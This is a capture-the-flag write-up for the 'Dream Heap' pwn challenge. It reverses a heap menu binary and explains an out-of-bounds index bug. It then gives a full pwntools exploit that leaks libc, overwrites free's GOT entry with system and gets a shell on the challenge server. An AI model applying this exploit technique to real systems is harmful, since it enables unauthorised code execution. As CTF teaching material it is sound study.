# Dream Heap

This writeup goes out to my friend and the person who made this challenge the man the myth the legend himself, noopnoop.

```
$	file dream_heaps 
dream_heaps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9968ee0656a4b24cb6bf5ebc1f8f37d4ddd0078d, not stripped
$	pwn checksec dream_heaps 
[*] '/Hackery/swamp/dream/dream_heaps'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./dream_heaps 
Online dream catcher! Write dreams down and come back to them later!

What would you like to do?
1: Write dream
2: Read dream
3: Edit dream
4: Delete dream
5: Quit
> 
```

So we are given a libc file `libc6.so`, and a `64` bit elf with no PIE or RELRO. The elf allows us to make dreams, read dreams, edit dreams, and delete dreams.

### Reversing

When we look at the main function, we see that it is essentially just a menu for the four different options. When we look at the IDA psuedocode for the `new_dream` function which allows us to write new dreams, we see this:

```
__int64 new_dream()
{
  int size; // [sp+Ch] [bp-14h]@1
  void *buf; // [sp+10h] [bp-10h]@1
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  size = 0;
  puts("How long is your dream?");
  __isoc99_scanf("%d", &size);
  buf = malloc(size);
  puts("What are the contents of this dream?");
  read(0, buf, size);
  HEAP_PTRS[INDEX] = (__int64)buf;
  SIZES[INDEX++] = size;
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

So for making a new dream, it first prompts us for a size. It then mallocs a space of memory equal to the size we gave it. It then let's us scan in as many bytes as we specified with the size. It then will save the heap pointer and the size of the space in the `HEAP_PTRS` and `SIZES` bss arrays at the addresses `0x6020a0` and  `0x6020e0`. The index in the array will be equal to the value of `INDEX` which is a bss integer stored at `0x60208C`. After this it will increment the value of `INDEX`. Next up we have the read function:

```
__int64 read_dream()
{
  int i; // [sp+Ch] [bp-14h]@1
  __int64 ptr; // [sp+10h] [bp-10h]@3
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which dream would you like to read?");
  i = 0;
  __isoc99_scanf("%d", &i);
  if ( i <= INDEX )
  {
    ptr = HEAP_PTRS[i];
    printf("%s", ptr);
  }
  else
  {
    puts("Hmm you skipped a few nights...");
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

Here we can see that it prompts us for an index to `HEAP_PTRS`, and first checks that it is not larger than `INDEX` to prevent us from reading something past it. It will then grab a pointer from `HEAP_PTRS` from the desired index, and print it. However there is a bug here. While it checks to make sure that we gave it an index smaller than or equal to `INDEX`, it doesn't check to see if we gave it an index smaller than one. This bug will allow us to read something from memory before the start of the `HEAP_PTRS` array in the bss. In addition to that since `INDEX` is incremented after it adds a new value, it will be equal to the next dream that is allocated. Since it just checks to make sure our index isn't greater than `INDEX` we can go past one spot for the end of the pointers in `HEAP_PTRS`. Next up we have the `edit_dream` function:

```
__int64 edit_dream()
{
  int offset; // [sp+8h] [bp-18h]@1
  int size; // [sp+Ch] [bp-14h]@3
  void *buf; // [sp+10h] [bp-10h]@3
  __int64 v4; // [sp+18h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  puts("Which dream would you like to change?");
  offset = 0;
  __isoc99_scanf("%d", &offset);
  if ( offset <= INDEX )
  {
    buf = (void *)HEAP_PTRS[offset];
    size = SIZES[offset];
    read(0, buf, size);
    *((_BYTE *)buf + size) = 0;
  }
  else
  {
    puts("You haven't had this dream yet...");
  }
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

So here it prompts us for an index, and has the same vulnerable index check from `read_dream`. If the index check passes it will take the pointer stored in `HEAP_PTRS` and the integer stored in `SIZES` at the index you specified and allow you to write that many bytes to the pointer. After that it will null terminate the buffer by setting `ptr + size` equal to `0x0`. However since arrays are zero index, it should be `ptr + (size - 1)` and thus it gives us a single null byte overflow. The last function we'll look at closely is the `delete_dream` function:

```
__int64 delete_dream()
{
  int i; // [sp+Ch] [bp-14h]@1
  void *ptr; // [sp+10h] [bp-10h]@3
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which dream would you like to delete?");
  i = 0;
  __isoc99_scanf("%d", &i);
  if ( i <= INDEX )
  {
    ptr = (void *)HEAP_PTRS[i];
    free(ptr);
    HEAP_PTRS[i] = 0LL;
  }
  else
  {
    puts("Nope, you can't delete the future.");
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

So just like the `read_dream` and `edit_dream` functions, it prompts us for an index and runs a vulnerable check on it. If it passes, it will free the pointer in `HEAP_PTRS` stored at that index and set it equal to 0 (so no use after free here). However it leaves the corresponding value in `SIZES` behind.

### Exploitation

So we have an index check bug with the read, edit, and free function. On top of that we have a single null byte overflow. We can use the index check bug in the read function to get a libc infoleak. After that we can use the index check bug with the edit function to get that got table overwrite. The intended solution was to use the single null byte overflow to cause heap consolidation, however this seems a bit easier.

For the infoleak libc infoleak, we will need a pointer to a pointer to a libc address. Luckily for us since there is no PIE we can just read an address from the got table (which is a table mapping various functions to their libc addresses). However first we will need an address to the got table, which we can find and know without a leak:

```
gef➤  p puts
$5 = {<text variable, no debug info>} 0x7ffff7a7c690 <_IO_puts>
gef➤  search-pattern 0x7ffff7a7c690
[+] Searching '0x7ffff7a7c690' in memory
[+] In '/Hackery/swamp/dream/dream_heaps'(0x602000-0x603000), permission=rw-
  0x602020 - 0x602038  →   "\x90\xc6\xa7\xf7\xff\x7f[...]" 
gef➤  search-pattern 0x602020
[+] Searching '0x602020' in memory
[+] In '/Hackery/swamp/dream/dream_heaps'(0x400000-0x401000), permission=r-x
  0x400538 - 0x400539  →   "`" 
```

Here we can see that the address `0x400538` will work for us. To leak the address we just need to read the dream at offset `-263021`. This is because HEAP_PTRS starts at `0x6020a0` and `0x6020a0 - 0x400538 = 0x201b68` and `0x201b68 / 8 = 263021`. 

Now for the got overwrite, we can use a couple of things to exploit that. Firstly if we make enough dreams, they will overflow into the sizes. This is because there isn't a check for this, and `SIZES` starts at `0x6020e0` and `HEAP_PTRS` starts at `0x6020a0`. The difference between the two is `0x40` bytes, and since pointers are `0x8` bytes it will just be `8` pointers before we start overflowing them. In addition to that since ints are `4` bytes, the two will overlap nicely and end up being written behind the pointers. When we try making a lot of different dreams, we see that we can end up writing a pointer than can be reached by the `edit_dream` function:

```
gef➤  x/30g 0x6020a0
0x6020a0 <HEAP_PTRS>:	0x00000000013ea020	0x00000000013ea040
0x6020b0 <HEAP_PTRS+16>:	0x00000000013ea070	0x00000000013ea0b0
0x6020c0 <HEAP_PTRS+32>:	0x00000000013ea100	0x00000000013ea160
0x6020d0 <HEAP_PTRS+48>:	0x00000000013ea1d0	0x00000000013ea250
0x6020e0 <SIZES>:	0x00000000013ea2e0	0x00000000013ea380
0x6020f0 <SIZES+16>:	0x00000000013ea430	0x00000000013ea4f0
0x602100:	0x00000000013ea5c0	0x00000000013ea6a0
0x602110:	0x00000000013ea790	0x00000011013ea890
0x602120:	0x0000003300000022	0x0000005500000044
0x602130:	0x0000007700000066	0x0000009900000088
0x602140:	0x000000bb000000aa	0x000000dd000000cc
0x602150:	0x00000000013eaac0	0x00000000013eab50
0x602160:	0x00000000013eac00	0x00000000013eacc0
0x602170:	0x00000000013ead90	0x00000000013eae70
0x602180:	0x0000000000000000	0x0000000000000000
``` 

The pointers are addresses like `0x13eaac0`, and the sizes are the integers like `0x99` and `0x88`. At `0x602128` (which would be at index `17`) we can see would be a nice place to write a pointer with the sizes. This is not only because we control it with sizes, but when we edit a dream it will also grab a size from the `SIZES` array that we will need to be at least `0x8`. If we choose index `17`, it will grab the integer from `0x602124` which we also control it with the sizes. So by choosing the offset 17 to edit, by making dreams with certain sizes we can control both the address that is written to and the size.

Also for the function that we will be overwriting the got address of will be `free` at `0x602018`. This is because it won't cause any real issues for us, and to get a shell we will just have to free a dream witht he contents `/bin/sh`.

### Code

Putting it all together into our exploit, we get:
```
from pwn import *

target = remote("chal1.swampctf.com", 1070)
#target = process('./dream_heaps', env={"LD_PRELOAD":"./libc6.so"})
#gdb.attach(target)

puts = 0x662f0
system = 0x3f630
offset = system - puts

def write(contents, size):
	print target.recvuntil('> ')
	target.sendline('1')
	print target.recvuntil('dream?')
	target.sendline(str(size))
	print target.recvuntil('dream?')
	target.send(contents)

def read(index):
	print target.recvuntil('> ')
	target.sendline('2')
	print target.recvuntil('read?')
	target.sendline(str(index))
	leak = target.recvuntil("What")
	leak = leak.replace("What", "")
	leak = leak.replace("\x0a", "")
	leak = leak + "\x00"*(8 - len(leak))
	leak = u64(leak)
	log.info("Leak is: " + hex(leak))
	return leak

def edit(index, contents):
	print target.recvuntil('> ')
	target.sendline('3')
	print target.recvuntil('change?')
	target.sendline(str(index))
	#raw_input()
	target.send(contents[:6])

def delete(index):
	print target.recvuntil('> ')
	target.sendline('4')
	print target.recvuntil('delete?')
	target.sendline(str(index))


puts = read(-263021)


write('/bin/sh\x00', 0x10)
write('0'*10, 0x20)
write('0'*10, 0x30)
write('0'*10, 0x40)
write('0'*10, 0x50)
write('0'*10, 0x60)
write('0'*10, 0x70)
write('0'*10, 0x80)
write('0'*10, 0x90)
write('0'*10, 0xa0)
write('0'*10, 0xb0)
write('0'*10, 0xc0)
write('0'*10, 0xd0)
write('0'*10, 0xe0)
write('0'*10, 0xf0)
write('0'*10, 0x11)
write('0'*10, 0x22)
write('0'*10, 0x18)
write('0'*10, 0x602018)
write('0'*10, 00)

edit(17, p64(puts -0x2a300))

delete(0)

target.interactive()
```

when we run it:

```
$	python exploit.py 
[+] Opening connection to chal1.swampctf.com on port 1070: Done
Online dream catcher! Write dreams down and come back to them later!

.	.	.

Which dream would you like to delete?
[*] Switching to interactive mode

$ w
 02:22:24 up 8 days,  3:46,  0 users,  load average: 0.00, 0.05, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
dream_heaps
flag.txt
$ cat flag.txt
flag{d0nt_bE_nu11_b3_dul1}
```

Just like that, we captured the flag!
